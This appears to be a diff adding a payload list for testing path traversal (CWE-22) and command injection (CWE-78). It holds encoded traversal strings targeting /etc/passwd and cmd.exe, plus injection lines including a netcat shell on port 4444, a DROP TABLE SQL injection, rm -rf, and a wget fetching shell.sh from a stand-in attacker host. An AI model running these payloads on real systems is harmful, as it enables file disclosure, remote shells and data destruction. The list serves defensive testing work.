@@ -1,0 +1,25 @@
+CWE-22 (Path Traversal) Test Payloads
+
+[TEST] ../../../../../../etc/passwd
+[TEST] %2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd (URL-encoded)
+[TEST] ....//....//....//etc/passwd (double-dot encoding)
+[TEST] /etc/passwd (absolute path)
+[TEST] ~/../../../etc/passwd
+[TEST] ..\..\..\..\Windows\System32\drivers\etc\hosts (Windows)
+[TEST] %5c..%5c..%5cWindows\System32\cmd.exe (backslash encoding)
+[TEST] file:///etc/passwd
+[TEST] \\\\.\\C:\\Windows\\System32\\cmd.exe (UNC path)
+[TEST] ..%255c..%255c..%255cWindows\\System32\\cmd.exe (double-encoded)
+
+CWE-78 (Command Injection) Test Payloads
+
+[OBFUSCATED] ; id
+[OBFUSCATED] $(whoami)
+[OBFUSCATED] | cat /etc/passwd
+[OBFUSCATED] && nc -lvp 4444 -e /bin/sh
+[OBFUSCATED] ' OR '1'='1'; DROP TABLE users--
+[OBFUSCATED] "; rm -rf /tmp/*
+[OBFUSCATED] %3Bcat%20/etc/passwd (URL-encoded)
+[OBFUSCATED] sleep 10 (time-delay test)
+[OBFUSCATED] echo 'malicious-code' > /tmp/exploit.sh
+[OBFUSCATED] wget http[:]//attacker[.]com/shell.sh -O /tmp/shell.sh
